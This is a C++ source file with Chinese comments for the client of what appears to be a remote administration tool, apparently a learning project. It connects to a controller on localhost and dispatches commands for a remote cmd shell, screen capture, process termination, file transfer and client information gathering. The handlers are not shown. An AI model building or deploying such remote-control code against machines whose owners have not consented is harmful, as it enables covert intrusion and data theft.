// Server.cpp : 定义控制台应用程序的入口点。
//
#include "stdafx.h"
#include "Client.h"
#pragma comment(lib, "ws2_32.lib")
extern SOCKET sClient;

//心跳包
void HeartBeat()
{
    bool bRet = false;
    while (true)
    {
        Sleep(20 * 1000);
        bRet = SendData(sClient, CLIENT_HEART, NULL, 0);
        if (!bRet) 
        {
            break;
        }
    }
}

//初始化
void Init()
{
    WORD wVersionRequested;
    WSADATA wsaData;
    int err;

    wVersionRequested = MAKEWORD(2, 2);

    err = WSAStartup(wVersionRequested, &wsaData);
    if (err != 0) {
        /* Tell the user that we could not find a usable */
        /* WinSock DLL.                                  */
        return;
    }

    //1 建立SOCKET（套接字）
    int nRet;
    //TCP
    sClient = socket(AF_INET,
        SOCK_STREAM,//数据流, 流式
        IPPROTO_TCP);

    //绑定端口1-65535和 IP 0.0.0.0
    sockaddr_in name;
    name.sin_family = AF_INET;
    name.sin_port = htons(9999);
    name.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
    int nLength = sizeof(sockaddr_in);

    //4 accept 接收连接
    char szBuf[256] = { 0 };
    char szBufFmt[256] = { 0 };

    nRet = connect(sClient, (sockaddr*)&name, nLength);

    //
    if (nRet == SOCKET_ERROR) {
        return;
    }

    std::thread* ptd = new std::thread(HeartBeat);
}

void HandleData() 
{
	
	tagPacket pkt;
	char* pData = NULL;

	while (true)
    {
		//收取包头
		bool bRet = RecvData(sClient,
			(char*)&pkt,
			sizeof(tagPacket));
		if (!bRet)
		{
			return;
		}

		if (pkt.nLength > 0) 
        {
			//收取包的附加数据
		    pData = new char[pkt.nLength];
			bool bRet = RecvData(sClient,
				(char*)pData,
				pkt.nLength);
			if (!bRet)
			{
				return;
			}
		}
	
		//表示已经成功的收到了一个命令包，开始解包分析包
		switch (pkt.ucode)
		{
			case SERVER_CREATE_CMD:
			{
				//表示是服务器发送过来的创建CMD的命令
				OnServerCmd(sClient, pData, pkt.nLength);
			}
			break;

			case SERVER_SEND_COMMAND:
			{
				//表示是服务器发送过来的cmd其他命令
				OnServerCmdData(sClient, pData, pkt.nLength);
			}
			break;

			case SERVER_CREATE_SCREEN:
			{
				//表示是服务器发送过来的屏幕命令
				OnServerScreen(sClient, pData, pkt.nLength);
			}
			break;

			case SERVER_SCREEN_DATA:
			{
				//表示是服务器发送过来的屏幕命令
				OnServerScreenData(sClient, pData, pkt.nLength);
			}
			break;

            case SERVER_CREATE_PROCESS:
            {
                //表示是服务器发送过来的进程命令
                OnServerProcess(sClient, pData, pkt.nLength);
            }
            break;

            case SERVER_PROCESS_DATA:
            {
                //表示是服务器发送过来的进程命令
                OnServerProcessData(sClient, pData, pkt.nLength);
            }
            break;

            case SERVER_TERMINATE_PROCESS:
            {
                //表示是服务器发送过来的进程命令
                OnServerTerminateProcess(sClient, pData, pkt.nLength);
            }
            break; 

            case SERVER_CREATE_FILE:
            {
                //表示是服务器发送过来的进程命令
                OnServerFile(sClient, pData, pkt.nLength);
            }
            break;

            case SERVER_FILE_INIT:
            {
                //表示是服务器发送过来的进程命令
                OnServerFileInit(sClient, pData, pkt.nLength);
            }
            break;

            case SERVER_FILE_DATA:
            {
                //表示是服务器发送过来的进程命令
                OnServerFileData(sClient, pData, pkt.nLength);
            }
            break;

            case SERVER_GET_FILEHEADER:
            {
                //表示是服务器发送过来的进程命令
                OnServerFileHeader(sClient, pData, pkt.nLength);
            }
            break;

            case SERVER_GET_FILE:
            {
                //表示是服务器发送过来的进程命令
                OnServerFileDownLoad(sClient, pData, pkt.nLength);
            }
            break;

            case SERVER_GETCLIENTINFO:
            {
                //获取客户端信息
                OnServerGetClientInfo(sClient, pData, pkt.nLength);
            }
            break;

		default:
			break;
		}


		if (pData != NULL) 
        {
			delete[] pData;
			pData = NULL;
		}
	}
}

int main()
{

	Init();

    std::thread t(HandleData);

    t.join();

	return 0;
}

